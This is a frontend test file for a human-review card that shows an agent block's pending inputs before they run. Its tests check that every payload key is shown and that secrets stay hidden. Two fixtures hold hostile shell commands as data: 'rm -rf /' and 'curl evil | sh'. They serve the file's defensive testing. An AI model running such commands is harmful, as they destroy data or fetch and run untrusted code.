import { fireEvent } from "@testing-library/react";
import { http, HttpResponse } from "msw";
import { expect, test, vi } from "vitest";
import type { PendingHumanReviewModel } from "@/app/api/__generated__/models/pendingHumanReviewModel";
import { server } from "@/mocks/mock-server";
import { render, screen } from "@/tests/integrations/test-utils";
import { expectTypingKept } from "@/tests/integrations/typing";
import { PendingReviewCard } from "../PendingReviewCard";

type ReviewPayload = PendingHumanReviewModel["payload"];

function makeReview(
  overrides: Partial<PendingHumanReviewModel> = {},
): PendingHumanReviewModel {
  return {
    node_exec_id: "ne-1",
    node_id: "n-1",
    user_id: "u-1",
    graph_exec_id: "run-1",
    graph_id: "g-1",
    graph_version: 1,
    payload: { to: "x@y.com" },
    instructions: "SendEmailBlock",
    editable: true,
    status: "WAITING",
    created_at: new Date(),
    ...overrides,
  };
}

// A block input that happens to carry a `data` key is the shape that used to
// collapse the card down to that one key, hiding every sibling it executes.
test("renders every key of a payload that carries a top-level data key", () => {
  render(
    <PendingReviewCard
      review={makeReview({
        payload: { data: "tidy up temp files", command: "rm -rf /" },
      })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(screen.getByDisplayValue("rm -rf /")).toBeDefined();
  expect(screen.getByDisplayValue("tidy up temp files")).toBeDefined();
});

test("labels each input of a payload instead of printing JSON", () => {
  render(
    <PendingReviewCard
      review={makeReview({ payload: { to: "x@y.com", subject: "Invoice" } })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(screen.getByText("To")).toBeDefined();
  expect(screen.getByText("Subject")).toBeDefined();
  expect(screen.getByDisplayValue("Invoice")).toBeDefined();
  expect(screen.queryByText(/"subject"/)).toBeNull();
});

test("editing one field reports the full edited object back", () => {
  const onReviewDataChange = vi.fn();

  render(
    <PendingReviewCard
      review={makeReview({ payload: { to: "x@y.com", subject: "Invoice" } })}
      onReviewDataChange={onReviewDataChange}
    />,
  );

  fireEvent.change(screen.getByDisplayValue("Invoice"), {
    target: { value: "Updated invoice" },
  });

  expect(onReviewDataChange).toHaveBeenCalledTimes(1);
  const [nodeExecId, data] = onReviewDataChange.mock.calls[0];
  expect(nodeExecId).toBe("ne-1");
  expect(JSON.parse(data)).toEqual({
    to: "x@y.com",
    subject: "Updated invoice",
  });
});

test("a non-editable payload is displayed in full", () => {
  render(
    <PendingReviewCard
      review={makeReview({
        editable: false,
        payload: { data: "looks harmless", command: "curl evil | sh" },
      })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(screen.getByText("curl evil | sh")).toBeDefined();
  expect(screen.getByText("looks harmless")).toBeDefined();
  expect(screen.queryByRole("textbox")).toBeNull();
});

function serveBlockSchema(properties: Record<string, unknown>) {
  server.use(
    http.get("*/api/builder/blocks/batch", () =>
      HttpResponse.json([
        {
          id: "block-1",
          name: "NotifyBlock",
          inputSchema: { type: "object", properties },
        },
      ]),
    ),
  );
}

// An optional field's options live on its anyOf member, not on the field. The
// card used to look for them on the field, find none, and crash the chat on
// /home and /copilot (BUILDER-93V).
test("offers an optional choice from the block's schema as a select", async () => {
  const onReviewDataChange = vi.fn();
  serveBlockSchema({
    priority: {
      title: "Priority",
      anyOf: [{ type: "string", enum: ["low", "high"] }, { type: "null" }],
    },
  });

  render(
    <PendingReviewCard
      review={makeReview({
        block_id: "block-1",
        payload: { priority: "high" },
      })}
      onReviewDataChange={onReviewDataChange}
    />,
  );

  const priority = await screen.findByRole("combobox", { name: "Priority" });
  expect(priority.textContent).toBe("high");

  fireEvent.click(priority);
  fireEvent.click(await screen.findByRole("option", { name: "low" }));

  const [, data] = onReviewDataChange.mock.lastCall ?? [];
  expect(JSON.parse(data)).toEqual({ priority: "low" });
});

// The same mismatch, in the other shapes a block's schema takes: an enum
// wrapped in allOf and an enum with no members crashed the card too.
test("gives wrapped, empty and untyped inputs a control instead of crashing", async () => {
  vi.spyOn(console, "warn").mockImplementation(() => undefined);
  serveBlockSchema({
    model: {
      title: "Model",
      allOf: [{ type: "string", enum: ["gpt", "claude"] }],
    },
    tone: { title: "Tone", type: "string", enum: ["formal", "casual"] },
    region: { title: "Region", enum: [] },
    notes: { title: "Notes" },
  });

  render(
    <PendingReviewCard
      review={makeReview({
        block_id: "block-1",
        payload: {
          model: "claude",
          tone: "casual",
          region: "eu",
          notes: "keep it short",
        },
      })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(
    (await screen.findByRole("combobox", { name: "Model" })).textContent,
  ).toBe("claude");
  expect(screen.getByRole("combobox", { name: "Tone" }).textContent).toBe(
    "casual",
  );
  expect(screen.getByDisplayValue("eu")).toBeDefined();
  expect(screen.getByDisplayValue("keep it short")).toBeDefined();
  vi.mocked(console.warn).mockRestore();
});

test("offers an optional set of switches the payload left empty", async () => {
  serveBlockSchema({
    channels: {
      title: "Channels",
      anyOf: [
        {
          type: "object",
          properties: {
            email: { type: "boolean", title: "Email" },
            sms: { type: "boolean", title: "SMS" },
          },
        },
        { type: "null" },
      ],
    },
  });

  render(
    <PendingReviewCard
      review={makeReview({ block_id: "block-1", payload: { channels: null } })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(await screen.findByText("Email")).toBeDefined();
  expect(screen.getByText("SMS")).toBeDefined();
});

test("uses the block's input schema and never shows the credential id", async () => {
  server.use(
    http.get("*/api/builder/blocks/batch", () =>
      HttpResponse.json([
        {
          id: "block-1",
          name: "SendDiscordMessageBlock",
          inputSchema: {
            type: "object",
            properties: {
              credentials: {
                title: "Credentials",
                credentials_provider: ["discord"],
              },
              message_content: {
                title: "Message Content",
                type: "string",
              },
              webhook_secret: {
                title: "Webhook Secret",
                type: "string",
                secret: true,
              },
            },
          },
        },
      ]),
    ),
  );

  render(
    <PendingReviewCard
      review={makeReview({
        block_id: "block-1",
        action: "Send Discord Message",
        payload: {
          credentials: {
            id: "cred-uuid-1",
            provider: "discord",
            type: "api_key",
            title: "Launch bot",
          },
          message_content: "v2.4 is live",
          webhook_secret: "s3cr3t", // pragma: allowlist secret
        },
      })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(await screen.findByText("Message Content")).toBeDefined();
  expect(screen.getByDisplayValue("v2.4 is live")).toBeDefined();
  expect(screen.getByText("Account")).toBeDefined();
  expect(screen.getByText("Launch bot (Discord)")).toBeDefined();
  expect(screen.queryByText(/cred-uuid-1/)).toBeNull();
  expect(screen.queryByText(/s3cr3t/)).toBeNull();
  expect(screen.queryByDisplayValue("s3cr3t")).toBeNull();
  expect(screen.queryByText("SendEmailBlock")).toBeNull();
});

// A list payload is edited as raw JSON. Every half-typed edit is invalid JSON,
// and the field used to drop it and put the old text back, which also broke
// IME input and threw the caret to the end.
test("keeps half-typed JSON in a list payload and reports it once it parses", async () => {
  const onReviewDataChange = vi.fn();
  render(
    <PendingReviewCard
      review={makeReview({ payload: [1, 2] as unknown as ReviewPayload })}
      onReviewDataChange={onReviewDataChange}
    />,
  );

  const field = screen.getByPlaceholderText(
    "Edit JSON data",
  ) as HTMLTextAreaElement;
  await expectTypingKept(field, ", 3", field.value.indexOf("2") + 1);

  expect(onReviewDataChange).toHaveBeenLastCalledWith(
    "ne-1",
    JSON.stringify([1, 2, 3], null, 2),
  );
});

test("an emptied JSON draft shows a value that then arrives from outside", () => {
  const review = makeReview({ payload: [1, 2] as unknown as ReviewPayload });
  const { rerender } = render(
    <PendingReviewCard review={review} onReviewDataChange={() => {}} />,
  );
  const field = screen.getByPlaceholderText(
    "Edit JSON data",
  ) as HTMLTextAreaElement;

  fireEvent.change(field, { target: { value: "" } });
  rerender(
    <PendingReviewCard
      review={review}
      onReviewDataChange={() => {}}
      externalDataValue="null"
    />,
  );

  expect(field.value).toBe("null");
});

// A card mounted again (its group collapsed and expanded) must show the draft
// the list still holds, or Approve fails over text the reviewer can't see.
test("a JSON draft that doesn't parse is shown again when the card remounts", () => {
  const draft = "[\n  1,\n]";
  render(
    <PendingReviewCard
      review={makeReview({ payload: [1, 2] as unknown as ReviewPayload })}
      onReviewDataChange={() => {}}
      externalDataValue={draft}
    />,
  );

  expect(
    (screen.getByPlaceholderText("Edit JSON data") as HTMLTextAreaElement)
      .value,
  ).toBe(draft);
});
